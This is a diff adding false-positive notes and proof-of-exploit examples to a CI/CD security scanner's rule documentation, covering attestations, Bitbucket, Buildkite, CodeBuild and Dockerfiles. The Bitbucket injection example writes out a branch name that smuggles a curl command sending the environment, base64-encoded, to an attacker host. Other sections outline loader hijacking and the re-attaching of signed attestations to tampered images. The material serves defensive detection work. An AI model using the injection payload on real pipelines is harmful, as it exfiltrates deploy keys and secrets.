+Hex validation is conservative: the value must consist entirely of ``0-9`` and ``a-f`` (case-insensitive) and the length must be a multiple of two (a valid byte encoding). Algorithm-specific length checks (``sha256`` = 64 chars, ``sha1`` = 40) are not enforced here, some registries truncate to a 16-char prefix and the rule accepts those as long as the bytes are well-formed.
+
+**Recommendation.** Configure the builder to emit Statements with a non-empty ``subject`` array whose entries each carry a populated ``digest`` map. The digest value must be a real hex encoding of the artifact's bytes, an empty string or all-zeros placeholder defeats verification. For BuildKit this is automatic when ``--attest=type=provenance`` is set alongside ``--push``; older Buildx versions sometimes emitted Statements with empty subjects, upgrade if you see this fire on a recent build. For slsa-github-generator and cosign-attested workflows the subject is populated by the framework, an empty subject usually means a custom attestor was wired up incorrectly.
+
+**Known false positives.**
+
+- Some experimental attestor implementations emit Statements with placeholder subjects for in-flight verification (the bytes are still being uploaded when the attestation is signed). Suppress per-manifest via ``--ignore-file`` if the team has a documented review of the deferred-binding pattern; the default expectation for any image promoted to a production registry is a subject digest that matches the actual image bytes.
+- Multi-subject Statements (one attestation covering multiple sibling artifacts) are accepted, as long as *every* entry has a populated digest. A partially-filled subject array fires because the unbound entries are the substitution surface, the rest don't compensate.
+
+**Seen in the wild.**
+
+- [in-toto Statement spec](https://github.com/in-toto/attestation/blob/main/spec/v1/statement.md): the subject digest is the cryptographic bind between a signed envelope and the artifact bytes. A placeholder value reduces the attestation to a free-floating signature attackers can re-attach.
+- [SLSA v1.0 verifying artifacts](https://slsa.dev/spec/v1.0/verifying-artifacts): consumers MUST compare the attestation's subject digest against the artifact they're about to use. A signed envelope whose subject is unbound to artifact bytes passes signature verification but fails this comparison step trivially — which is exactly what an attacker exploits when re-attaching a valid signature to a tampered image.
+
+**Proof of exploit.**
+
+# Vulnerable: a Statement signed by a trusted builder but
+# carrying an empty subject digest. The signature is valid;
+# the bind to the image bytes is not.
+{
+  "_type": "https://in-toto.io/Statement/v1",
+  "subject": [
+    {"name": "image", "digest": {"sha256": ""}}
+  ],
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": { ... }
+}
+
+# Attack: an attacker who can re-publish the signed DSSE
+# envelope (the envelope is public on the OCI registry the
+# image is pushed to) attaches it to a tampered image. The
+# consumer's verifier checks the signature (valid, the
+# builder did sign this Statement), checks the source repo
+# (valid, ATTEST-002 passes), checks the builder identity
+# (valid, ATTEST-001 passes), and never gets to compare
+# the subject digest because the digest is empty. Result:
+# the tampered image looks fully attested.
+
+# Safe: subject digest populated with the actual image
+# config digest BuildKit / slsa-github-generator emit by
+# default when wired up correctly.
+{
+  "_type": "https://in-toto.io/Statement/v1",
+  "subject": [
+    {"name": "image",
+     "digest": {
+       "sha256": "4d5a6e7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f70819"
+                    "a2b3c4d5e6f70819a2b3c4d5e6f70819"
+     }}
+  ],
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": { ... }
+}
+
+**Source:** [`ATTEST-005`](../providers/oci.md#attest-005) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-006`: SLSA provenance lacks a meaningful buildType <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-006 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
+
+**How this is detected.** Reads the ``buildType`` claim at the spec-appropriate path: v0.2 at ``predicate.buildType``, v1 at ``predicate.buildDefinition.buildType``. Fires when the claim is missing, an empty string, or a known placeholder (``example.com``, ``unknown``, ``n/a``, ``tbd``). A well-shaped buildType is a URI with a scheme and a path component; the rule does a conservative URI-shape check to catch typos like a bare repository name or an unfilled template token.
+
+Doesn't validate that the URI is reachable or that the schema it names is one a verifier knows about; that's policy-layer work (an allowlist of trusted buildType URIs is a separate consumer-side concern).
+
+**Recommendation.** Configure the builder to emit a concrete ``buildType`` URI naming the schema the provenance follows. For slsa-github-generator that's automatic (``https://github.com/slsa-framework/slsa-github-generator/<workflow>@<ref>``). For BuildKit the canonical URI is ``https://github.com/Attestations/GitHubHostedActions@v1`` or one of the SLSA-listed build types at https://slsa.dev/buildtypes/. Custom in-house generators should publish their own buildType URI that points at a stable schema doc; the URI doesn't need to be globally registered, but it does need to be resolvable so consumers can review the schema.
+
+**Known false positives.**
+
+- Some experimental generators emit a buildType under a placeholder URI during development (``https://example.com/buildtype/v1``). The rule fires on those by design; the canonical fix is to publish a real schema URI before any image ships to a registry that downstream consumers trust. Suppress per-manifest via ``--ignore-file`` only when the team has a documented review of the placeholder's intended scope.
+- BuildKit < v0.10 emitted Statements without a buildType field at all. Modern Buildx always populates it; if the rule fires on a current build, the provenance configuration is likely incomplete rather than the Buildx version being too old.
+
+**Seen in the wild.**
+
+- [SLSA v1.0 provenance spec](https://slsa.dev/spec/v1.0/provenance): buildType is REQUIRED on every Statement. The spec calls out that consumers MUST refuse provenance whose buildType they don't recognize, which means an under-specified buildType reduces the attestation to advisory text the verifier can't act on.
+- [SLSA build types catalog](https://slsa.dev/buildtypes/): the publicly registered buildType URIs SLSA-aware tooling knows how to verify. Provenance that names an unregistered URI is acceptable when paired with a documented schema, but provenance with no URI at all is structurally unverifiable.
+
+**Proof of exploit.**
+
+# Vulnerable: a self-rolled SLSA generator that omits the
+# buildType field. The predicate carries every other
+# claim (builder, materials, configSource) but consumers
+# can't tell which schema those claims follow.
+{
+  "_type": "https://in-toto.io/Statement/v1",
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": {
+    "buildDefinition": {
+      "externalParameters": {...},
+      "resolvedDependencies": [...]
+      // no buildType key
+    },
+    "runDetails": {"builder": {"id": "..."}}
+  }
+}
+
+# Attack surface: a consumer verifying this Statement with
+# a policy of 'only accept buildType = <list>' has no field
+# to match against. Two common downstream outcomes:
+#   1. The verifier rejects every Statement (over-strict);
+#   2. The verifier accepts every Statement (over-loose),
+#      which means an attacker forging materials in a
+#      different schema slips by because the verifier
+#      can't tell the schemas apart.
+
+# Safe: emit a concrete buildType URI. For slsa-github-
+# generator the framework fills this in automatically:
+{
+  "predicate": {
+    "buildDefinition": {
+      "buildType": "https://github.com/slsa-framework/"
+                    "slsa-github-generator/generic@v2",
+      ...
+    }
+  }
+}
+
+**Source:** [`ATTEST-006`](../providers/oci.md#attest-006) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-007`: SBOM packages lack supplier / originator attribution <span class="pg-sev pg-sev--low">LOW</span> { #detail-attest-007 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation, [`CICD-SEC-10`](#ctrl-cicd-sec-10) Insufficient Logging and Visibility.
+
+**How this is detected.** Walks every SBOM attestation (SPDX + CycloneDX) and counts components / packages without supplier attribution. SPDX checks ``packages[*].supplier``; CycloneDX checks ``components[*].supplier.name`` (the spec uses an object with a ``name`` key, unlike SPDX's bare string). A package passes when the field exists, is non-empty, and isn't the ``NOASSERTION`` sentinel.
+
+Severity LOW because the failure mode is downstream correlation friction rather than direct execution risk. Pair with ATTEST-003 (version completeness) for the full SBOM-quality story; an SBOM that has versions but no suppliers, or suppliers but no versions, is only half actionable.
+
+**Recommendation.** Configure the SBOM emitter to populate supplier and (where applicable) originator fields for every component. Syft / Trivy / cdxgen all support supplier inference from package-manager metadata; the field is most often missing because the generator was invoked without the relevant ecosystem authority configured. For hand-rolled SBOM pipelines, derive ``supplier`` from the package registry (``pkg:npm/foo`` -> ``Organization: https://npmjs.com``) or the upstream maintainer's published metadata. ``NOASSERTION`` is acceptable only when the package truly has no identifiable supplier; treating it as a routine default defeats downstream attribution.
+
+**Known false positives.**
+
+- Air-gapped builds where the SBOM emitter genuinely cannot resolve a supplier (private registry without ecosystem metadata) legitimately ship ``NOASSERTION`` for affected packages. Suppress per-manifest via ``--ignore-file`` when the gap is documented; the default expectation for any image promoted to a production registry is supplier attribution on every third-party component.
+- System-injected components (``glibc`` from a distroless base image, kernel symbols) sometimes carry no supplier because the SBOM emitter didn't have distro metadata available. The rule fires by design; the canonical fix is to provide a supplier of last resort (e.g. the base image vendor) rather than to suppress.
+
+**Seen in the wild.**
+
+- [NTIA SBOM Minimum Elements report](https://www.ntia.gov/files/ntia/publications/sbom_minimum_elements_report.pdf) (2021): supplier name is listed as a minimum required element. NTIA's quality assessment of real-world SBOMs consistently flagged supplier coverage as one of the lowest-scoring dimensions across producers.
+- Typosquat and mirror-replay supply-chain incidents (the broad class behind event-stream, ua-parser-js, and tj-actions): the attacker substitutes a package whose name + version match a legitimate one but whose supplier differs. SBOMs with supplier attribution let downstream consumers detect the substitution by comparing publisher identity; SBOMs without it carry no signal at all.
+
+**Source:** [`ATTEST-007`](../providers/oci.md#attest-007) in the [OCI manifest provider](../providers/oci.md).
+
 #### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Bitbucket pipes are docker-image references. Major-only (`:1`) or missing tags let Atlassian/the publisher swap the image contents. Full semver or sha256 digest is required.
 
@@ -1326,6 +1757,46 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 **How this is detected.** $BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are populated from SCM event metadata the attacker controls. Interpolating them unquoted into a shell command lets a crafted branch or tag name can execute inline.
 
 **Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.
+
+**Known false positives.**
+
+- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.
+
+**Proof of exploit.**
+
+# Vulnerable: branch name interpolated unquoted into shell.
+image: alpine:latest
+pipelines:
+  pull-requests:
+    '**':
+      - step:
+          name: triage
+          script:
+            - echo Building $BITBUCKET_BRANCH
+            - ./scripts/build.sh $BITBUCKET_BRANCH
+
+# Attack: open a PR from a branch whose name is shell:
+#
+#   git checkout -b 'foo;curl https://attacker/x \
+#     -d "$(env|base64)";:'
+#
+# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
+# the shell parses the line, so the `;` becomes a command
+# separator and the curl exfils the step's env (which holds
+# every repository / workspace variable in scope, including
+# deploy keys configured for the pipeline).
+
+# Safe: double-quote and pass via env so the value is only
+# consumed as data.
+      - step:
+          name: triage
+          script:
+            - echo "Building $BRANCH"
+            - ./scripts/build.sh "$BRANCH"
+          # Bitbucket has no declarative env block; assign
+          # via shell so the value is captured as a single
+          # argv element from the controlled assignment.
+          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)
 
 **Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -1473,7 +1944,7 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 
 **Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -1518,6 +1989,10 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 **How this is detected.** Bitbucket's `after-script` runs unconditionally after the main `script` block (including on failure). If the `after-script` references secrets or tokens, those values may leak into build logs or artifacts even when the step fails unexpectedly. This check detects secret-like variable references in `after-script` blocks.
 
 **Recommendation.** Move secret-dependent operations into the main `script:` block. `after-script` runs even when the step fails and executes in a separate shell context, credential exposure here is harder to audit and more likely to persist in logs.
+
+**Known false positives.**
+
+- The detector matches any variable whose name contains ``TOKEN`` / ``SECRET`` / ``PASSWORD`` / ``KEY`` (case-insensitive). Names that are descriptive rather than secret (``CACHE_KEY``, ``SORT_KEY``, ``TOKEN_TYPE`` used as a label, ``API_KEY_NAME`` storing the *name* of the key rather than its value) trigger the regex even though they aren't credentials. The rule has no way to tell from the name alone, suppress per-step via ``--ignore-file`` when the referenced value is benign.
 
 **Source:** [`BB-019`](../providers/bitbucket.md#bb-019) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -1664,6 +2139,10 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Known false positives.**
+
+- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.
+
 **Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).
 
 #### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }
@@ -1673,6 +2152,10 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 **How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.
 
 **Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.
+
+**Known false positives.**
+
+- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).
 
 **Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -1744,7 +2227,7 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 
 **Evidences:** [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
 
-**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognises cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.
+**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.
 
 **Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.
 
@@ -1894,6 +2377,44 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Move secrets to AWS Secrets Manager or SSM Parameter Store and reference them using type SECRETS_MANAGER or PARAMETER_STORE in the CodeBuild environment variable configuration.
 
+**Proof of exploit.**
+
+# Vulnerable: CodeBuild project with a plaintext PAT in env.
+{
+  "name": "deploy",
+  "environment": {
+    "environmentVariables": [
+      {"name": "GITHUB_TOKEN",
+       "value": "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+       "type": "PLAINTEXT"}
+    ]
+  }
+}
+
+# Exposure surface (no exploit needed, the value just leaks):
+#  - codebuild:BatchGetProjects returns the value to anyone with
+#    that permission (often broader than `codebuild:StartBuild`).
+#  - CloudTrail's UpdateProject / CreateProject events record
+#    the full env block in audit logs.
+#  - The buildspec can ``echo $GITHUB_TOKEN`` and the value
+#    lands in the build log group, readable by anyone with
+#    logs:GetLogEvents on the group.
+#  - The AWS console shows the value to anyone with project
+#    read access; no separate decrypt permission gates it.
+
+# Safe: reference Secrets Manager / SSM, never store the
+# plaintext on the project.
+{
+  "name": "deploy",
+  "environment": {
+    "environmentVariables": [
+      {"name": "GITHUB_TOKEN",
+       "value": "arn:aws:secretsmanager:us-east-1:111111111111:secret:gh-pat-AbCdEf",
+       "type": "SECRETS_MANAGER"}
+    ]
+  }
+}
+
 **Source:** [`CB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 #### `CB-002`: Privileged mode enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-002 }
@@ -2007,7 +2528,7 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 #### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Orb references in the `orbs:` block must include an `@x.y.z` suffix to lock a specific version. References without `@`, with `@volatile`, or with only a major (`@1`) or major.minor (`@5.1`) version float and can silently pull in malicious updates.
 
@@ -2063,7 +2584,7 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Evidences:** [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
 
-**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognises cosign, sigstore, slsa-framework, and notation-sign as signing tools.
+**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.
 
 **Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.
 
@@ -2073,7 +2594,7 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Evidences:** [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
 
-**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognises CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
+**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
 
 **Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.
 
@@ -2221,7 +2742,7 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -2694,6 +3215,10 @@ CMD ["python3", "/app/app.py"]
 
 **Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.
 
+**Known false positives.**
+
+- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.
+
 **Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).
 
 #### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }
@@ -2854,7 +3379,7 @@ CMD ["python3", "/app/app.py"]
 
 **Evidences:** [`CICD-SEC-7`](#ctrl-cicd-sec-7) Insecure System Configuration.
 
-**How this is detected.** Recognises ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.
+**How this is detected.** Recognizes ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.
 
 **Recommendation.** Don't ``chown`` system directories at build time. If the runtime user needs to own a workload-specific subtree, ``COPY --chown=<user>:<group>`` it into the image at the subtree root, or place the workload under a dedicated directory (e.g. ``/app``, ``/srv/app``) and ``chown`` only that path. Granting the runtime user write access to ``/etc``, ``/usr``, ``/sbin``, or ``/lib`` lets a process exploit later steps to stage a binary the system trusts.
 
@@ -2891,6 +3416,132 @@ CMD ["python3", "/app/app.py"]
 - An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.
 
 **Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).
+
+#### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+
+**How this is detected.** Three shapes are detected: ``pip install --trusted-host <host>``, ``pip install -i http://...`` (or ``--index-url http://...``), and ``pip install --extra-index-url http://...``. All three tell pip to accept whatever the upstream returns without certificate verification. The result is a build-time supply-chain MITM surface: anyone able to inject responses on the network path between the build host and the index can ship arbitrary wheels into the image. Complements the generic TLS-bypass primitive (which catches ``pip config set global.trusted-host``) by covering the per-invocation flag form most teams actually reach for.
+
+**Recommendation.** Drop ``--trusted-host`` and switch any ``-i`` / ``--index-url`` / ``--extra-index-url`` to ``https://``. If the internal index has a self-signed certificate, install the CA into the image's truststore (``ca-certificates`` + ``update-ca-certificates``) instead of telling pip to skip verification. ``--trusted-host`` whitelists the host across the entire pip invocation, so a single ``RUN`` line ends up fetching every dependency over an unverified connection.
+
+**Known false positives.**
+
+- An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.
+
+**Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).
+
+#### `DF-022`: RUN uses npm install instead of npm ci <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-022 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+
+**How this is detected.** Mirrors GHA-022 / GL-022 / JF-021 (CI-side lockfile integrity) at the image-build layer. The build-time consequence is the same shape: dependency resolution happens against the live registry rather than against the committed lockfile, so the image ends up carrying whatever the registry served at build time rather than the set the team audited. The rule fires on bare ``npm install`` / ``npm i`` as well as on flagged variants (``--no-package-lock``, ``--force``, ``--legacy-peer-deps``) which all defeat the lockfile contract one way or another.
+
+**Recommendation.** Switch to ``npm ci`` (or ``yarn install --frozen-lockfile`` / ``pnpm install --frozen-lockfile`` for those toolchains). ``npm ci`` requires a ``package-lock.json`` and fails the build if it disagrees with ``package.json``; it never rewrites the lockfile and never installs packages outside the locked set. ``npm install`` does the opposite: it resolves ranges in ``package.json`` at build time and happily mutates the lockfile to fit the resolution, so a transient dependency the team never reviewed can land in the image.
+
+**Known false positives.**
+
+- Multi-stage build whose runtime image copies in a pre-computed ``node_modules`` and never installs at build time is unaffected, the rule only fires on directives that actually invoke ``npm install``.
+- ``npm install --production`` is still flagged: it ignores ``devDependencies`` but still re-resolves and mutates the lockfile. Use ``npm ci --omit=dev`` instead.
+
+**Source:** [`DF-022`](../providers/dockerfile.md#df-022) in the [Dockerfile provider](../providers/dockerfile.md).
+
+#### `DF-023`: ENV sets a dynamic-loader hijack variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-023 }
+
+**Evidences:** [`CICD-SEC-7`](#ctrl-cicd-sec-7) Insecure System Configuration.
+
+**How this is detected.** ``LD_PRELOAD``, ``LD_LIBRARY_PATH``, and ``LD_AUDIT`` are consulted by ``ld-linux`` for every dynamically-linked binary the image runs. A baked-in value gives an attacker who can drop a file inside the container (via a writable mount, a vulnerable upload handler, a build-stage hold-over) the ability to hook ``libc`` calls in privileged processes, intercept TLS, or shim ``execve`` to reroute commands. ``LD_LIBRARY_PATH`` pointing at a writable directory is the milder shape of the same risk: a planted ``libc.so.6`` shadows the system lib for every later binary.
+
+**Recommendation.** Don't bake ``LD_PRELOAD`` / ``LD_LIBRARY_PATH`` / ``LD_AUDIT`` into the image. If a specific binary needs a non-standard library lookup, set the env var in the binary's own ``ENTRYPOINT`` wrapper so the override is scoped to that process, or, better, configure ``/etc/ld.so.conf.d/`` and rerun ``ldconfig`` at build time. A baked-in ``LD_*`` value applies to every process the image launches, including any shell an attacker reaches after an exploit.
+
+**Known false positives.**
+
+- Sanitizer-instrumented images (``LD_PRELOAD=libasan.so``) and APM agent hooks (``LD_PRELOAD=/opt/dynatrace/...``) are legitimate. Suppress the finding for the specific Dockerfile with a one-line rationale; the rule deliberately catches the pattern because the same shape is the standard loader-hijack escalation primitive.
+
+**Source:** [`DF-023`](../providers/dockerfile.md#df-023) in the [Dockerfile provider](../providers/dockerfile.md).
+
+#### `DF-024`: RUN npm/yarn/pnpm install runs lifecycle scripts <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-024 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-7`](#ctrl-cicd-sec-7) Insecure System Configuration.
+
+**How this is detected.** Fires on ``npm install`` / ``npm ci`` / ``npm i`` (non-global), ``pnpm install`` / ``pnpm i``, and ``yarn install`` / bare ``yarn`` in a ``RUN`` body when ``--ignore-scripts`` is absent from the same line. Detection short-circuits when the same Dockerfile sets ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` (``npm``), ``ENV YARN_ENABLE_SCRIPTS=false`` (yarn berry), or ``ENV CI=true`` is paired with an ``.npmrc`` configured to disable scripts (the env-level kill-switch is detected; the rule trusts ``.npmrc`` only when it's also written by the Dockerfile via ``echo ignore-scripts=true >> .npmrc``). Complements DF-022 (``npm ci`` vs ``npm install``), which guards lockfile integrity; DF-024 guards lifecycle-script execution. A pinned lockfile does not help when the pinned version is the malicious one, only ``--ignore-scripts`` does.
+
